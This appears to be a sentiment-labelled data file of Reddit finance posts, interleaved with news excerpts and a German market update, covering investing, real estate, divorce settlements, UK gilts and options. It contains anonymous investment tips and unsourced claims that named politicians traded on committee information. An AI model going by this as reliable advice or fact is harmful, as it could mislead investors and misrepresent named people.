capital raised by direct lenders totaled $25 billion in the second quarter of 2022, compared to $27.4 billion the prior year but down by a third from the fourth quarter.

u.s. syndicated leveraged loan refinancing volume fell to $249 billion in the first half of the year, down roughly 41% from the year prior, according to refinitiv.

1659800239;"&gt;the slide in u.s. stock prices punished berkshire hathaway inc's (brka.n) bottom line in the second quarter as the company run by billionaire warren buffett posted a $43.8 billion loss.

&gt;berkshire nevertheless generated nearly $9.3 billion of profit from its operating businesses, as improvement from reinsurance and the bnsf railroad offset a loss at the geico car insurer, where car parts shortages and higher vehicle prices boosted losses from accidents.

&gt;rising interest rates and dividend payouts helped berkshire's insurance units generate more money from investments, while the strengthening u.s. dollar boosted profit from the company's european and japanese debt investments.

&gt;berkshire also slowed purchases of its stocks, including its own, though it ended june with $105.4 billion of cash and equivalents it could still deploy.

&gt;""it shows the fickle nature of markets,"" said tom russo, a partner at gardner, russo &amp; quinn in lancaster, pennsylvania, who invests more than $8 billion, of which 17% is in berkshire. ""it's business as usual at berkshire hathaway.""

&gt;net results suffered from berkshire's $53 billion of losses from investments and derivatives.

&gt;stocks of three major holdings -- apple inc (aapl.o), bank of america corp and american express co (axp.n) -- each fell more than 21%, compared with a 16% decline in the standard &amp; poor's 500 (.spx).

1660089563;"i'm not the person who made the original distinction, but here's my take.

factors and styles are basically the same thing. some firms will tell you that there are subtle differences between them but it's basically all the same thing. aqr says [they're the same](https://funds.aqr.com/insights/fund-promo/style-investing). russell says factors indexes are just [more concentrated style indexes](https://www.ftserussell.com/research/styles-vs-factors-what-they-are-how-theyre-similardifferent-and-how-they-fit-within). 

though when i personally think about the difference between the two, the first thing that comes to mind is the [venn model](https://www.venn.twosigma.com/factors) by two sigma. in that model, factors are basically considered to be drivers of a portfolio's risk/return profile. pretty standard. but there's a split between macro factors and style factors. macro factors represent exposure to things like market, rates and credit risk (core macro) or secondary macro variables like fx risk, inflation-linked vs nominal rates risk (so basically t5yie and t10yie), home country vs foreign market risk (like us vs ex-us for an american investor, canada vs ex-canada for a canadian, etc.). on the other hand, styles represent exposure to *cross-sectional* drivers of risk and return like value and momentum in equities or carry in currencies.

styles are also more of a practitioner-based concept than factors. you don't really see them mentioned that much in academia. there, factors are often seen as proxies for consumption risk (merton's icapm state variable candidates) or expressions of firm-decisions that predict differences in firm-level cost of capital (zhang's icapm factors).

however, these semantics don't really matter. they have nothing to with your criticisms of value. think of the trades a value manager would have on right now. it's not a static long energy and financials short tech portfolio. and even if it was, all throughout this post you're implying that there's a tech industry premium (""modern tech growth strategies are so great"" and things like that) without anything to back it up. but back to the trades. just comparing the enterprise multiples (or p/es for banks) of some household names, it would be long $meta and short (or underweight) $pins. long $trow and short $blk. long $gs and short $ms. long $pep and short $ko. and these trades would probably just be on for a few months or less until the longs were repriced and migrated out of the value basket and/or the shorts were repriced and migrated out of the growth basket. how does a blitzscaling startup mechanically make these trades lose money? about 80% of them won't even be in tech sector. and the majority of those that are will be long and short mature firms. and even then, how does a random tech company's rapid asset growth make the expensive banks or asset managers or food and beverage companies beat the cheap ones? and that's before all the issues we know rapid asset growers face (terrible empirical performance, theoretically low cost of capital holding productivity constant per zhang's icapm, historically poor earnings growth in periods of low payout ratios for the market as a whole, etc.). i'm not saying the idea is completely terrible, there's definitely a lot of merit to the q-eg factor and to investing in companies with high levels of intangible investment, but even those strategies don't kill value investing. they're completely separate. the long-term correlation coefficient between hml and expected growth is 0.06. it's even positive. and the guy who discovered the expected growth factor literally publicly stated that he still has his own money in scv... 

anyways, it seems like you have a background in finance, so what do you even want us to tell you? you already know these counterarguments, so what do you really want to hear? that all academic and practitioner research on stock selection since fama-french or even security analysis is completely useless now despite the fact that new evidence confirming those core ideas is still continuously being brought to light? do you want the green light to buy arkk? pre-ipo shares in the next uber but for pool supplies?";4.0;;throwaway474673637;0.0;False;False;Positive;Positive;Neutral

1660569371;"small adjustment to your understanding... there are mutual funds and etfs that are 'actively managed' which is is the ""put your money in the hands of experts"" situation. these are smart people [occasionally] doing smart people things behind the scenes. they're human, so they can make mistakes.

index funds mostly take the humans out of it (i.e. 'passively managed'). there are usually hard rules to determine if a company meets the qualifications to be in a specific index. if yes then buy else don't buy.

for example, the retail sector index ([xrt](https://money.usnews.com/funds/etfs/consumer-cyclical/spdr-s-p-retail-etf/xrt#about)) only includes retail companies. so it'll buy best buy stock but it won't buy bank of america stock because bank of america will be in the financial sector index ([vfh](https://investor.vanguard.com/investment-products/etfs/profile/vfh))

these two 'sector' indexes still involve humans (i.e. you) to pick the sector that will have a lot of winners and not a lot of losers.

the simplest path to wealth is to pick the total us stock market index ([vtsax](https://advisors.vanguard.com/investments/products/vtsax/vanguard-total-stock-market-index-fund-admiral-shares)) which buys every single stock in the us. if publicly traded stock in us then buy else don't buy.

or if you're nervous about picking the us as the winner over every other country, you can pick a total world stock index fund ([vtwax](https://advisors.vanguard.com/investments/products/vtwax/vanguard-total-world-stock-index-fund-admiral-shares))

the point is, index funds are less smart people doing smart people things and instead just passively following whatever index they've been created to follow. it's more rule based and thus more predictable

average people should pick the biggest index they're comfortable with (us or world) so that they're ultra diversified and will own all the winners. you just have to trust that capitalism and government intervention will make sure there are more winners than losers in aggregate";4.0;;mildly_enthusiastic;0.0;False;False;Positive;Positive;Neutral

loosing customers who paid once and never paid again doesn't matter as it doesn't drive revenue and only generates costs.

while a company is in growth mode (customer acquisition) it doesn't matter as the growth in revenue from new customers is enough to keep shareholders happy and generate big exec bonuses.  the increasing cashflow of net new customers pays for the expansion and maintenance.

once a company finds it has tapped out a growth strategy that becomes unsustainable  due to what happens to cash flow.

at this point a company needs to find other ways to pay the recurring costs of all those customers they acquired - the growth in net new customers is not enough to cover those costs at the margins required.

that's just one angle, i have others like this, but don't want to bore you, lol :-)

1661395705;"if you’re interested in real estate, you have to start at cash flow. how long are you willing to wait to become cash flow positive?

residential real estate might give you leverage but you’re at the whim of residential tenancies laws and tenants. a lot (i’d say most but can’t back that with data) of tenants are genuinely pretty good. but there is a class of people who are professionals at gaming the system. because of this, it is remarkably hard to be cash flow positive with a single residential property. leverage is nice, but you always have to account for needing to drop $10k+ into your property before it is rentable again. and if you go residential, you have to be prepared to go 12-18 months without getting paid rent.

commercial is another option. i’m biased in favour of commercial because i bought into the commercial world a long time ago and it’s been a great investment. it’s more expensive but way more predictable and if you’re remotely entrepreneurial, you can often become your own tenant. you get the same leverage but with more predictable cash flows (unless you’re bad).

anyways, on to your questions.

corporate structure is complicated and i really recommend asking a very good lawyer. owning real estate will make you an attractive target for law suits. if i had hired a lawyer when i first got into commercial real estate, i would be about a decade ahead of where i am. don’t be me - lawyer up as soon as you can, tell them everything and do exactly what they say. they are experts at taking money from people who own real estate - take their advice on how to protect your money from other versions of them. there are too many variables to even start to get into here.

as for management companies, i have been really lucky. i started working with a realtor who was just getting started in his career but whose parents were extremely successful in the industry. i have always asked him for help and always ended up with great management companies. anecdotally, i have worked with four different management companies and they are all husband/wife teams. for all four, one partner has a ticket in a trade and the other is an accountant. it makes sense when you think about it, but the commonalities are really crazy to think about.

as for units, obviously i’m biased in favour of commercial over residential. commercial has its own bullshit but it’s way more predictable provided you or your representative is good at negotiating. buying a property is a lot like looking at a property - find quality builds (so you don’t spend your ‘leverage’ fixing shit. location matters to an extent but also remember the joys of gentrification. my very favourite holding was located in a complete shit hole area in a shit hole city when i bought it. then it got gentrified and between the craft brewer and tech companies with founders who are way cooler than me, i am beyond happy.

calgary is a weird city because of the o&amp;g boom and busts. when oil is low, you’ll find bargains. when oil is high, you’ll pay $ms for cardboard. on the other hand, when oil is high, you’ll lease to coke fiends and when oil is low, they can’t afford to look. areas are really unpredictable- the city seems to gentrify or go to shit on seven year cycles. i keep hearing that calgary will become a tech centre but the founders absolutely suck at being alive.

if i owned residential, i’d do one or two pets (but no more) and drop rent for good tenants. some people are really responsible and just want a stable place for their animals. those are the kinds of tenants i’d like. commercial is the opposite. take your dog to work companies go out of business.

i hope this helps a bit but it’s just my experience.";1.0;;Sudden-Ad7209;0.0;False;False;Positive;Positive;Positive

i, 18f, had a lot of problems last semester  with my spanish teacher, for context, i have cptsd and relaxation exercises give me panic attacks because i cannot relax, this teacher, who we'll call ms.n required her entire class to do relaxation exercises despite it being on my 504, that i do not have to do anything related to counseling in my classes as teachers aren't properly trained to deal with the fall out of my extensive trauma. 

now every single day i would have to re-explain the problem to ms.n that she could look at my 504, and that i would under no circumstances do the exercises. and multiple times she tried to write me up for insubordination, we also had multiple issues of her setting me up to be bullied by making me talk about my family in front of the class which led to a lot of mocking and bullying by other students for stupid things like having 16 siblings, or having to ask how to say ""foster parent"" in spanish. basically the entirety of last semester there was something that i had to explain to her that i couldn't do because it made me uncomfortable, i feel it important to note that no other teacher has ever had problems with the accommodations i receive, especially considering i have the proper paperwork. it got so bad that last semester for the last two days i just skipped spanish, despite having severe anxiety over being absent.

this previous week i met with my counselor and multiple of my teachers and we discussed that i have to take spanish ii  and my counselor insisted i have ms.n , but i argued back in front of her that that last semester it was a different issue everyday and that i could not properly learn in an environment like that, even arguing that my ""straight a's"" didn't prober her to be a competent teacher as i make an a in every class regardless of the teacher, and that my problem is not my learning, but my comfort. eventually my counselor agreed to place me in the other spanish teacher's class, 

when i got home and explained what happened with the counselor to my foster mom she said that she felt it was an asshole move to lay out all of problems bin front of ms.n and all of my other teachers, but i think that it was important for me to advocate for myself and i doubt asking for privacy would have helped. in addition to that, she is a teacher and should be accustomed to understanding that sometimes people just don't work well together. so am i the asshole?

\-don’t chase high dividend yield, look for quality (since you are 17, you should build a portfolio of high-quality stocks for your future self): $jnj $pfe $sny $nvs $rhhby $jpm $mmm $lrcx $amat $intc $mdt $goog $trow $csco $rio $klac $dow $tsn comes to my mind right now that are trading at a fair value


  
\-invest mostly in etfs: vti, voo, schd, $vgk, etc. (look for low expense ratios, good track record of performance, etc.)


  
\-don’t overpay, there are many other great companies at high valuations, wait for them to come down in price. to learn about valuations, learn how to read “income statements”, “balance sheets”, and “cash flow statements”. 


  
\-focus on raising your income so that you can put more money per month in safer investments like $vti $voo $schd etc. go to college if needed, get a degree that pays well, etc. (consider the tuition as an investment for future income)- but please don’t get a degree that doesn’t pay well, or in the worse case, you can’t find a job!


  
\-contribute consistently, sit back, relax, and retire in \~40 years from now. if you are in focus, you will be really wealthy in 40 years.

1. 401k from the employer: i am investing bi-weekly in my 401k account- i chose 4 different funds to equally contribute (25% each): 1 s&amp;p 500 fund, 1 high growth tech fund, 1 small cap fund, and 1 international fund. i do rebalance this account once or twice a year, but other than that it's purely passive ""buy &amp; hold"" investing (time horizon 15-20 years). 


  
2. roth ira account: i have a roth ira account, where i mostly invest in high-quality dividend stocks. i don’t have to pay taxes on my dividends in a roth ira account, so that’s the primary motivation for choosing a roth ira for dividend investing. i have some high-quality growth stocks too, which don’t pay any dividends now, but hopefully, in 10-15 years, they will. also, i do some active trading on this account to boost my returns: buy low/sell high (tax-free capital gains, however, the risk is if you lose the money you can’t claim a capital loss, so be careful!). some of my holdings: $goog $intc $lrcx $amat $mmm $vz $meta $baba $vti $iwf $trow $sbux $blk $jpm $csco $rio $cmcsa $dpz $adbe $mdt $klac $sny $rhhby $gsk $nvs $ul $qcom $dow 


  
3. individual brokerage account: this is my individual account where i buy high-quality growth stocks to hold for long-term (5-10 years or more). i can claim losses on this account. at the end of the year, i look at my taxable income on this account and sell some of the losers to offset my taxable capital gains. some of my holdings are: $amzn $meta $nflx $pypl $bkng $dis $ea $googl and about 25% cash to deploy (hopefully soon)


  
4. individual brokerage account (for options): a separate individual brokerage account only for options trading. this is around \~5% of my entire portfolio.

deutsche ceo had said exit 'would go against our values'

investors criticised deutsche's russia presence

ceo's 2021 pay up 20%

frankfurt, march 11 (reuters) - deutsche bank (dbkgn.de), which faced stinging criticism from some investors and politicians for its ongoing ties to russia, said on friday in a surprise move that it would wind down its business in the country.

deutsche joins the ranks of goldman sachs (gs.n) and jpmorgan chase (jpm.n), which were the first major u.s. banks to exit after moscow's invasion of ukraine. those moves put pressure on rivals to follow. read more .


deutsche had resisted pressure to sever ties, arguing that it needed to support multinational firms doing business in russia.


but on friday evening in frankfurt, the bank suddenly reversed course.

""we are in the process of winding down our remaining business in russia while we help our non-russian multinational clients in reducing their operations,"" the bank said.

""there won't be any new business in russia,"" deutsche said.


a day earlier, deutsche bank's chief executive christian sewing explained to staff why the bank was not withdrawing.

""the answer is that this would go against our values,"" he wrote. ""we have clients who cannot exit russia overnight.""

bill browder, an investor who has spent years campaigning to expose corruption in russia, said that deutsche bank staying was ""completely at odds with the international business community and will create backlash, lost reputation and business in the west.""




""i would be surprised if they are able to maintain this position as the situation in ukraine continues to deteriorate,"" browder told reuters earlier on friday.

the criticism came as russian forces bearing down on kyiv were regrouping northwest of the ukrainian capital and britain said that moscow could now be planning an assault on the city within days. read more 

fabio de masi, a former member of the bundestag and a prominent campaigner against financial crime, said that deutsche bank had close ties to the russian elite, many of whom faced sanctions and that the relationship, where it involved criminal russian activity, had to end.


deutsche bank has said that it has pared down its russian footprint in recent years. this week it disclosed 2.9 billion euros in credit risk to the country, and said exposure is ""very limited"". read more 


it also operates a technology centre with about 1,500 employees in russia and opened a new main office in moscow in december, which it said at the time represented ""a significant investment and commitment to the russian market"".";1.0;;Tane-Tane-mahuta;0.0;False;False;Negative;Positive;Negative

1663299946;"wow, there's a lot to unpack here, but a few things stand out.

first and foremost, his startup business.  this is a huge wildcard.

**how much is the company worth?  don't agree to anything until you're sure you know the answer to this question.**

valuing a business for purposes of divorce can be a very tricky and contentious issue, but it's super important because, as you've pointed out, there's the potential it could be worth a huge amount of money\*.\*  do [some research](https://marinercapitaladvisors.com/resources/business-valuation-issues-in-divorce), and ask your lawyer how to go about establishing a value for your husbands share of the business.  also, you'll probably want to get a copy of the stock agreement your husband has that gives him an interest in the company.  it'll have details about how many shares he has and what the rights and obligations are that goes along with that. (e.g. whether the company has a buy-back option)

it wouldn't surprise me at all if you were pleasantly shocked at how high that # is.  especially since your husband doesn't seem to want you to have any part of it in his offer to you.

(also, has your husband said anything about them actually having an ipo?  i ask because that would imply the business is worth several orders of magnitude more than anything else you've mentioned here.  like, 10s or 100s of millions of dollars... :-/ )

one thing to be aware of is that being entitled to 1/2 your husband's share of the company gives you a lot of leverage in negotiations.  for a small company, the prospect of having an ex-spouse hold an interest in the business presents an almost existential problem.  because what you're splitting is your husbands shares, not just the dollar amount.  and those shares likely represent a voting-interest.  holding those would make you a partner in the business, which would be all kinds of awkward for the other founders.

anyhow, definitely do your homework here.   and if you can share specifics about the nature of the business (what's the product / service they offer?  have they taken investment $$$ from anyone?  how many founders?  how many employees?  etc.)  i or someone else here might be able to offer further insight into how significant this is.

net result:  there's no way to value this aspect of your agreement at this time.  it could be worth $0, or it could be worth $ms.

\---

okay, next up is the house.  he's asking for is ""only"" 10% of $500k (the value of the home) but that makes it sound somewhat better than it is.  what really matters here is the equity you have in the home: $300k.  but you need to factor in selling costs, which typically knocks off \~15%.  so what your husband really wants is \~20% of the equity.

if the loan is in your name only, that's a good thing. mortgage rates are climbing rapidly - a trend that's likely to continue for the foreseeable future - so refinancing would be expensive\*.\*

net result: your husband is making a \~$90k concession here.

\&gt; he could pay for some thing to show that i can work full time

yeah, it's called ""imputed income"".  you can google it, but basically a court isn't interested in what a person's actual income is, what matters is what they can reasonable expect to make should they choose to work.  (mostly used for deadbeat spouses who claim they have no income because they're just too lazy to find a job.)

i wouldn't worry too much about this but, yes, a court will probably rule that you have the capacity to work full time at some reasonable level of income.

net result: 'might affect the support amount, but hard to ascertain by how much.

\---

\&gt; he pays 1 year alimony

after a 22 year marriage?  hmm... definitely talk to your lawyer about this.  the rule of thumb is that support runs for \~1/2 the duration of the marriage.  $800/month x 11 years is \~$105k.  your husband only wants to pay for 1 ($9.6k)

net result: you're conceding \~$96k here

\---

\&gt; apparently in our state a judge could rule he pays for life

use this for negotiation if need be.  ""for life"" is an awful long time, and potentially worth a lot of money.

\---

&gt;car (paid off worth about 50k in value)

net result: husband making \~$25k concession

\---

&gt;keep my retirement so no 10% penalty hit having to divide it up

check with your lawyer, but i believe retirement funds can be split in a divorce without incurring any costs.  you just need to provide the fund manager with a [qdro](https://www.investopedia.com/personal-finance/whats-qdro/) when requesting the funds be split.

\---

&gt;not sure i should take it (if it were legal to do so and lawyers on both sides agreed it was legit).

it's not really a question of legality or legitimacy.  your husband can offer whatever he wants, and you're welcome to agree to it or not.  as long as you're not being coerced or obviously being taken unfair advantage of, a court will let you do whatever you decide.

overall, i would not take this offer at this time.  it's not actually all that generous, and you're giving up a huge potential windfall (???) in the form of your interest in your husband's business.

the first order of business for you needs to be getting a good handle on how much this business is worth.  until you do that, you simply can't evaluate how good or bad any offer your husband makes is.";2.0;;duhvorced;0.0;False;False;Positive;Negative;Positive

1663333209;"&gt;i get half of it.. and the company does well and lets say it was worth a couple mil.. would he still have to pay me alimony too?

yes.  it would be unusual for a divorce decree to alter a person's obligation based on the future outcome of some risk that's been taken.  for example, if you keep the home and it gains or loses value, that wouldn't affect spousal support.  divorce decrees are based on a snapshot of your present-day situation.  you and your ex are expected to understand the risk associated with whatever assets you keep or give away, and be okay with that.

speaking of which, where your interest in the company is concerned my advice is that you **not** end up with shares in the business.  that's unlikely to be a good outcome for you, your stbx, or the business.  having you as a part-owner isn't really a good idea for a variety of reasons.  early-stage investors in businesses typically bring more to the table than just money.  they have contacts, resources, and experience that are of real benefit to the business.  you don't have that.  worse, having you involved would likely be a drag on your stbx's motivation to see the business succeed, which would have a ripple effect within the company, and make the odds of success for them less likely.

the best outcome there is for your husband to find a way to buy you out of your share of the business so the business can proceed to operate without too much disruption.  what you want is to be compensated for an amount that feels ""fair"" *today*, knowing that if the business fails you cashed out early and came out ahead, and if the business takes off... well... you still came out ahead, and will (hopefully) be happy that your husband's gamble paid off.

i've seen both sides of this, by the way.  cofounders that got divorced and gave up a lot in the settlement agreement (e.g. a house and/or retirmement accounts) to buy their spouse of their share of the business.   for one it worked out - those shares ended up being worth $ms.  for the other, not so much; the business shut down a few years later, leaving them with nothing to show for it.

it's part of the gamble that comes with being a startup entrepreneur.

oh... which reminds me of another reason why you don't want to have a share in the business:  it's counterproductive to good financial management practices.  shares in a startup are so risky, so volatile that they're impossible to incorporate into a traditional financial plan.  you have to effectively value them at $0 because too do otherwise is insane.  e.g. if you invest or take out loans in the hope you'll get a windfall payout from the business in 5-10 years, 9 times out of 10 you're going to wind up bankrupt.

so, for you, those shares are a bit of a poison pill.  you would be much better off having assets that are easier to work with.  stocks, bonds, retirement accounts, real estate... things that a financial planner (which you should probably have if you don't have one already) are familiar with, and know how to incorporate into a traditional portfolio.

alan lowenthal (d) ca sits on the transportation committee

his wife made some well timed trades on boeing, $ba
on mar 5 2020 she sold ~30k of $ba shares
one day later his committee releases damaging findings on the 737 jet
$ba went onto fall 35%+ in a week

(again) alan lowenthal (d) ca sits on the natural resources committee

his wife perfectly played two rallies on sunrun $run
nov 2019, bought ~$30k @ $14.50
feb 2020, sold ~45k @ $21
mar 2020, bought back in @ $9 
&amp; sold 78 times as the stock ran to $80
thats a cool 780% return


john rose (r) tn sits on the financial services committee

he sold shares of wells fargo, $wfc, a few months before his committee issued a critical report on the bank
11/12/19 - sold ~250k of $wfc @ $54.22
3/1/20 -  report’s published
$wfc tanked 30% a week later to $37


mike kelly (r) pa
his wife bought ~$50k of $clf just one day after being briefed that the commerce dept. launched an investigation to benefit the company
she bought at $4.70 and sold at $18.11, a 300% gain
interestingly, this was the only individual trade she made that year


richard burr (r) nc sits as the head intelligence committee
on 2/13/20 him &amp; family liquidated their entire portfolio and went into treasury bonds
one month later the $spy had its fastest 30% decline in history
this saved him $300k+ in possible losses


the wildest part about all of this though is that thousands of every day employees aren't allowed to trade individual stocks, consultants can’t do it. bankers can’t do it. even many reporters can’t do it. yet the most influential people in the country, our politicians, can and that is just some of it. but ya retirement and saving for 40+ years allow our politicians to make millions lmaoooooooooooooooooooooooooooooo



also a week ago the nyt posted an investigation into politicians trading stocks

they found that 81 democrats &amp; 101 republicans filed up to 3,700 trades and $100m in possible volume

many had 100% winners, with some perfectly timed

here’s examples of just how good they were.

first, of those 182 politicians, 90+ sat on committees that directly oversaw the companies they traded

49 were democrats
44 were republicans

which totals 18% of congress


25% of the energy &amp; natural resources committee traded $xom or $cvx

33% of the environment committee traded oil-field services

put simply: pension funds in the uk have been spicing up their annuity income via ldis, which involve using hedges and swaps (packaged up kindly by investment banks) in order to generate leveraged positions across junk bonds, mortgage backed securities (mbs), and so on. 

these ldis are

a) full of stuff that is priced off gilts (uk treasury bonds)

b) using gilts as collateral.

unfortunately, gilt prices are crashing. for a whole bunch of reasons relating to the uk fucking up, inflation, qt etc. but also because everyone is dumping gilts in order to maintain those fancy swaps and hedges and stuff. and the uk is being led by a parade of absolute fools. 

so - this is leading to a vicious circle of forced selling. as asset prices drop, margin calls happen, gilts get sold, gilt prices go down, everything reprices, .... more margin calls happen. of course not only gilts are getting sold, but they're getting sold *first*, whereas mbs etc junk bonds etc will get dumped en masse at the end. 

and i think this is having knock on effects on the us treasury markets; those of you long tlt will know what i'm talking about. 

the boe said it would not step in to fix the market till november. the next day they suddenly announced they would buy £65 billion of gilts above market price and pass the losses to the uk treasury / taxpayer. 

""hmmmm.""

i assume the goal is to slow or stop an epic-scale industry-wide synchronised margin call wrecking the pound, government debt, investment banks, mbs, junk bonds, etc. and a related credit freeze up in the style of 2008.

so you might want to have a little think *right now* about how much of these you have:

- anything that got turbo-fucked in 2008.

- investment banks likely to be counterparties in this trade in the uk, eu or us

- uk pension funds &amp; fund manager firms and life assurance firms

- mbs and junk bonds

- uk gilts, maybe t-bonds and euro t-bonds

£65 billion isn't *that* much, at the scale of pension funds of an entire country.

if you're totally new to inbesting, get a paper trading account and just practice. there will be many, many more chances to swing trade a ""big"" market event. don't get antsy and blow a bunch of money on fomo. but if you're going to anyways, watch a bunch of youtube first. understand what it is you are doing.

don't be a dumbass and *sell* options positions to open. do not. under any circumstances. *buy to open* options positions. buyers of call or put options are limited in their losses to the cost of the option. sellers of options face theoretically unlimited losses. don't wind up with a bill for 15 thousand dollars on a $400 bet. it is totally possible. people around here do it *all the time*.

don't buy fd's, a 30dte or more position is more suitable for swing trading. 0dte is for day traders who have met capital requirements and can buy/sell on margin (as in, they won't violate t+2 by moving money on and off different positions many times throughout the trading day).

yeah and btw, look up t+2, i have the feeling a lot of new people are going to get locked out of trading for 90 days while their short dated ""genius"" puts expire worthless.

probably stick to index etfs like $spy rather than individual stocks, even if you have a good ""thesis"" $spy is easier to predict by looking at vix (volatility index) and other shit. probably stick to itm or nearly itm, and a simple stop loss.

again, watch a bunch of youtube videos. avoid the shills.

i'm looking to buy calls on $xom deep into the drawdown that just started w/ it. i think it will generally bull into earnings october 28th. i'm looking to buy puts on $jpm but i am concerned it might bounce up a bit into earnings friday. bad earnings makes go down right? or will that get spun into the ""pressures the fed to pivot"" narrative?? i will watch and probably buy puts on thursday, unless it's in a nosedive all week then i'll need to wait for it to recover before i feel comfortable opening the position. i just took 26% profit on a $jpm put. happy with the play, want to play again. 

idk what to do with $spy right now, and realistically i don't think i'll have confidence to open a position until 2-3 weeks go by, unfortunately premiums will probably be even worst then. it's just on the churt it looks like it's gonna rally into the big inning of november. idk.

1665798160;"“u .s. banks wrote down $1 billion on leveraged and bridge loans in the second quarter as rising interest rates made it tougher for them to offload high-risk debt onto investors and other lenders.

this was highlighted by the sale in september of $8.55 billion in loans and bonds backing the leveraged buyout of business software company citrix systems inc (ctxs.mx).

a group of banks led by bank of america (bac.n), credit suisse (csgn.s) and goldman sachs (gs.n) took a collective $700 million loss on the deal, reuters previously reported.

                              the wall street giant is leading a group of banks to provide $12.5 billion in debt financing tesla (tsla.o) ceo elon musk's 
                               buyout of social media giant twitter inc (twtr.n) .

morgan stanley ceo james gorman said his bank has been ""quite cautious in the leveraged finance arena."" he later added, ""frankly, it's just not that troubling.""

the turmoil in the leveraged finance market is also weighing on mergers and acquisitions, which slowed sharply in the third quarter.

""there’s no doubt that the cost of capital has gone up materially for debt financing of private equity transactions over the past 6-9 months,"" said kevin sterling, global co-head of private credit at goldman sachs during an event this month. that means borrowers need more cash to operate in an environment with higher costs, he said.”";4.0;;BikkaZz;0.0;False;False;Positive;Positive;Negative

&gt;morgan stanley: if rates fall ahead of a decline in inflation (which we expect), “it will give legs to the rally that began last thursday .. we think 4000 is as good a guess as any and would not rule out another attempt to re-take the 200-day moving average (~4150).” [wilson]

**the y axis is based on current options pricing - the implied move**, this is the closest expiration straddle break-even, ie how much move in either direction needed to turn profit .

the upper part of the graph (above the y=x middle line) are stocks where the implied is higher than the past average - expectations are higher than what happened in the past. and vice versa for the lower part and undervalued

1666332162;"guten morgen zusammen, ein letztes mal diese woche gibt es mein kurzes morgenupdate.

in brüssel haben sich die staats- und regierungschefs der eu-staaten beim gipfeltreffen auf gemeinsame maßnahmen zur eindämmung der ansteigenden energiepreise geeinigt. die 27 länder haben sich unter anderen darauf geeinigt, an einem gemeinsamen gaspreisdeckel arbeiten zu wollen. von der leyen zufolge unterstützten die eu-staaten außerdem den jüngsten gesetzesvorschlag der eu-kommission, in zukunft gemeinsam gas einzukaufen, um die macht des europäischen marktes bei der nachfrage nach gas zu erhöhen. zudem soll eine ""kosten-nutzen-analyse"" für die deckelung der gaspreise für den energiesektor vorgelegt werden. die staats- und regierungschefs nannten keinen zeitrahmen, wann die entscheidungen über die preisobergrenzen fallen sollen. 

die ratingagenturen moody's und s&amp;p global wollen am freitag entscheiden, ob sie die kreditwürdigkeit von großbritannien herabstufen. damit könnten die finanzierungskosten des staates mitten in der regierungskrise steigen. 

der bundestag stimmt heute nach einer debatte über den 200 milliarden euro schweren abwehrschirm gegen die sprunghaft gestiegenen energiepreise ab. dazu soll der in der coronavirus-pandemie geschaffene wirtschaftsstabilisierungsfonds (wsf) reaktiviert und befüllt werden. 

adidas muss seine gewinn- und umsatzerwartungen zum zweiten mal innerhalb von drei monaten deutlich zurückschrauben. der gewinn aus dem fortgeführten geschäft werde in diesem jahr nur noch bei 500 millionen euro liegen, teilte die nummer zwei auf dem weltmarkt hinter nike mit. das wäre ein rückgang um zwei drittel gegenüber dem vorjahr (1,49 milliarden). 

deutsche bank hat einem insider zufolge mitarbeiter aus dem emissions- und beratungsgeschäft im investmentbanking in new york entlassen. das institut baut wegen des schwachen geschäfts mit übernahmen und fusionen personal ab, wie eine mit den plänen vertraute person sagte.

pne - die us-investmentbank morgan stanley prüft einen verkauf ihres 40-prozent-anteils an dem deutschen windparkentwickler pne. das cuxhavener unternehmen bestätigte entsprechende informationen von insidern, über die die nachrichtenagentur reuters berichtet hatte.

credit suisse - im skandal um mutmaßliche manipulationen am devisenmarkt hat die krisengeplagte schweizer großbank vor einem us-geschworenengericht einen sieg errungen.

credit suisse trennt sich von ihrer beteiligung am madrider technologieunternehmen allfunds 53,9 millionen aktien sollen nach bankenangaben in einem bookbuilding-bieterverfahren verkauft werden. 

sika - der schweizer bauchemiekonzern hat in den ersten neun monaten erneut ein rekordergebnis eingefahren. der umsatz zog auch dank akquisitionen um 16,6 prozent auf 8,0 milliarden franken an, wie das unternehmen mitteilte. der gewinn kletterte um 15,8 prozent auf 765,1 millionen franken. sika konnte gestiegene rohmaterialpreise durch preiserhöhungen teilweise wettmachen und senkte die kosten weiter. 

der snapchat-mutterkonzern snap hat sein niedrigstes umsatzwachstum seit dem börsengang vor fünf jahren verzeichnet und damit seine aktie auf talfahrt geschickt. der foto-messengerdienst machte eine zurückhaltung der werbekunden angesichts der hohen inflationsrate für die entwicklung verantwortlich. ""wir erwarten, dass das operative umfeld in den kommenden monaten weiter herausfordernd bleibt"", hieß es in einem brief an investoren.

dem us-kurznachrichtendienst twitter droht einem medienbericht zufolge nach der übernahme durch tesla-chef elon musk ein massiver job-kahlschlag in den kommenden monaten. die ""washington post"" berichtet unter berufung auf dokumente und interviews, dass musk knapp 75 prozent der rund 7500 twitter-mitarbeiter loswerden wolle. 

l'oreal - starke nachfrage in europa und den vereinigten staaten hat den umsatz des kosmetikkonzerns im dritten quartal um 9,1 prozent auf 9,58 milliarden euro steigen lassen. 

vivendi- das französische medienunternehmen hat im dritten quartal den umsatz auf vergleichbarer basis um 0,6 prozent gesteigert, unter anderem dank starken wachstums der werbetochter havas.
    
galeria - nach der kündigung des sanierungstarifvertrags des warenhauskonzerns durch das management will die gewerkschaft verdi verhandlungen mit der unternehmensleitung aufnehmen. 

in japan sind die kernverbraucherpreise im september so schnell wie seit acht jahren nicht mehr gestiegen. wie aus offiziellen daten der regierung hervorging, stieg der kernverbraucherpreisindex (vpi) für das land, der ölprodukte einschließt, aber die preise für frische lebensmittel ausschließt, im vergleich zum vorjahr um 3,0 prozent. 

ungarn würde einem hochrangigen berater von minister präsident viktor orban zufolge einen etwaigen erdgas-preisdeckel der eu nicht mittragen. sollten sich die anderen eu-staaten auf einen solchen schritt einigen, müsste es wie bereits beim öl für sein land beim gas eine ausnahme geben, sagt balazs orban der nachrichtenagentur reuters.

der wirtschaftsverband bga kritisiert vor dem hintergrund des ukraine-krieges das lieferkettengesetz. ""die größte gefahr für den freien handel ist derzeit nicht der russische krieg gegen die ukraine, sondern das deutsche und das europäische lieferkettengesetz"", sagte der präsident des bundesverbandes großhandel, außenhandel, dienstleistungen (bga), dirk jandura, der ""rheinischen post"".

1666550517;"i think imperial brands ($imbby) and blackstone ($bx) are great growth stocks with a lot of potential and a good dividend. imperial brands has a large portfolio of tobacco brands and products with a lot of international exposure, they also own familiar names like backwoods cigars and cohiba, which is a high end brand of cuban cigars. the company also owns blu vapes and pulze heated tobacco, which is also a somewhat emergent sector in the tobacco industry. i also think imperial brands has potential to merge or be bought out by a larger firm. 

